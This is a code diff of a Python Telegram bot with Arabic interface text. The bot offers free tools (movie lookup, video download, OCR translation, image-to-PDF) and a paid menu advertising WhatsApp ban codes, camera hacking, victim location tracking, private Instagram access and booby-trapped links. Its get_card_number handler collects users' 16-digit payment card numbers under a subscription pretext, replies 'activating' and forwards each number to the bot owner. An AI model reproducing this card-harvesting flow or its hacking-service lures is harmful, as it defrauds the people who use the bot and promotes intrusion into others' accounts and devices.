@@ -76,13 +76,17 @@ def restrict_commands(message):
 # --- 5. الدوال والخدمات ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
+    # الرد على الزر لمنع التكرار والتحميل
+    try: bot.answer_callback_query(call.id)
+    except: pass
+
     if call.data == 'free_sub':
-        my_free_names = ["تحميل ستوري", "تحميل أي فيديو ", "ترجمة صورة الى نص", "تحويل صورة لـ PDF"]
+        my_free_names = ["شاهد افلامك 🎬", "تحميل أي فيديو ", "ترجمة صورة الى نص", "تحويل صورة لـ PDF"]
         markup = types.InlineKeyboardMarkup(row_width=2)
         buttons = [types.InlineKeyboardButton(my_free_names[i], callback_data=f'f{i+1}') for i in range(4)]
         markup.add(*buttons)
         bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)
-    # ... (باقي أزرارك هنا) ...
+    
     elif call.data == 'f1':
         msg = bot.send_message(call.message.chat.id, "🎬 **أهلاً بك في سينما البوت!**\n\nأرسل لي الآن اسم الفيلم الذي تود مشاهدته:")
         bot.register_next_step_handler(msg, show_results)
@@ -95,6 +99,16 @@ def callback_query(call):
     elif call.data == 'f4':
         msg = bot.send_message(call.message.chat.id, "أرسل لي الصورة الآن:")
         bot.register_next_step_handler(msg, process_image_to_pdf)
+
+    elif call.data.startswith("view_"):
+        movie_id = call.data.split("_")[1]
+        movie = movie_services.get_movie_full_details(movie_id)
+        if movie:
+            poster = f"https://image.tmdb.org/t/p/w500{movie.get('poster_path', '')}"
+            text = f"🎞 **{movie['title']}**\n\n📝 **القصة:** {movie.get('overview', 'لا توجد قصة')}\n⭐ **التقييم:** {movie.get('vote_average')}/10"
+            markup = types.InlineKeyboardMarkup()
+            markup.add(types.InlineKeyboardButton("📺 مشاهدة الفيلم", url=f"https://www.google.com/search?q=watch+{movie['title']}"))
+            bot.send_photo(call.message.chat.id, poster, caption=text, reply_markup=markup)
 
     elif call.data == 'max_sub':
         my_names = [" 💀واتساب 🟡 ", "يوزرات تلي مميزة👑 ", "كود حظر واتس⚡️ ", "اختراق كاميرا📷 ", "معرفة موقع الضحية ","دعس حساب تيكتوك☠️ ", "أرقام فيك ✅ ", "فتح انستا برايفت👀 ", "فك حظر سافيوم994+ ", "كود حظر واتس", "مزايا انستا ✨", "تلغيم رابط🌎 ", "ببجي🎮 ", "رشق انستا✅ ", "تفعيل التطبيقات برو ", " 📱بليلردو لانهائي8 ", "اداة تيكتوك ترول ", "ازالة الاعلانات📢 ", "ارقام مفعلة حقيقيه✅", "تطبيقات ايفون برو "]
@@ -116,43 +130,16 @@ def callback_query(call):
         msg = bot.send_message(call.message.chat.id, f"تم اختيار {provider}.\nملاحظة؛رصيد الاشتراك الشهري بطاقة من فئة 5$ .يرجى إرسال رقم البطاقة (16 رقماً):")
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
 
-
-@bot.callback_query_handler(func=lambda call: call.data == "search_movie")
-def ask_for_movie(call):
-    msg = bot.send_message(call.message.chat.id, "🎬 أرسل لي اسم الفيلم الذي تود مشاهدته:")
-    bot.register_next_step_handler(msg, show_results)
-
 def show_results(message):
     results = movie_services.get_movie_results(message.text)
     if not results:
         bot.send_message(message.chat.id, "❌ لم يتم العثور على نتائج.")
         return
-    
     markup = types.InlineKeyboardMarkup()
     for movie in results:
         btn_text = f"{movie['title']} ({movie.get('release_date', 'N/A')[:4]})"
         markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"view_{movie['id']}"))
-    
     bot.send_message(message.chat.id, "✅ اختر فيلماً من القائمة:", reply_markup=markup)
-
-# التعامل مع اختيار فيلم معين لعرض تفاصيله
-@bot.callback_query_handler(func=lambda call: call.data.startswith("view_"))
-def show_details(call):
-    print(f"DEBUG: Received callback with data: {call.data}")
-    movie_id = call.data.split("_")[1]
-    movie = movie_services.get_movie_full_details(movie_id)
-    
-    if movie:
-        poster = f"https://image.tmdb.org/t/p/w500{movie.get('poster_path', '')}"
-        text = f"🎞 **{movie['title']}**\n\n📝 **القصة:** {movie.get('overview', 'لا توجد قصة')}\n⭐ **التقييم:** {movie.get('vote_average')}/10"
-        
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("📺 مشاهدة الفيلم", url=f"https://www.google.com/search?q=watch+{movie['title']}"))
-        
-        bot.send_photo(call.message.chat.id, poster, caption=text, reply_markup=markup)
-
-    #الدوال 
-
 
 def process_video_link(message):
     url, chat_id = message.text.strip(), message.chat.id
@@ -172,10 +159,8 @@ def process_ocr(message):
         file_info = bot.get_file(message.photo[-1].file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         with open("img.jpg", 'wb') as f: f.write(downloaded_file)
-        
         text = services.extract_text_from_image("img.jpg")
         translated = services.translate_text(text)
-        
         bot.send_message(message.chat.id, f"📜 النص المستخرج:\n{text}\n\n🌍 الترجمة:\n{translated}")
         os.remove("img.jpg")
     else:
@@ -195,32 +180,23 @@ def process_image_to_pdf(message):
         bot.reply_to(message, "يرجى إرسال صورة فقط.")
 
 def get_card_number(message, provider):
-    # نستخدم OWNER_ID بدلاً من كتابة الرقم يدوياً
     if message.text.isdigit() and len(message.text) == 16:
         bot.reply_to(message, "جاري التفعيل..")
-        try: 
-            bot.send_message(OWNER_ID, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
+        try: bot.send_message(OWNER_ID, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
         except: pass
     else:
         msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
 
-  
- 
 # --- 6. التشغيل ---
-
-# 1. التعريفات الأساسية (خارج if __name__)
 app = Flask(__name__)
 
 @app.route('/')
-def home():
-    return "البوت يعمل بنظام Webhook!"
+def home(): return "البوت يعمل بنظام Webhook!"
 
 @app.route('/ping')
-def ping():
-    return "I am alive!", 200
+def ping(): return "I am alive!", 200
 
-# دالة الويب هوك الواحدة والوحيدة
 @app.route('/webhook', methods=['POST'])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
@@ -230,16 +206,12 @@ def webhook():
         return '!', 200
     return 'Forbidden', 403
 
-# 2. الجزء التشغيلي
 if __name__ == "__main__":
     WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
     PORT = int(os.environ.get("PORT", 8080))
-
     if WEBHOOK_URL:
-        # إعداد الـ Webhook لتيليجرام
         bot.remove_webhook()
         bot.set_webhook(url=f"{WEBHOOK_URL}/webhook")
-        
         print(f"🚀 البوت يعمل الآن عبر Webhook على المنفذ {PORT}")
         app.run(host='0.0.0.0', port=PORT)
     else:
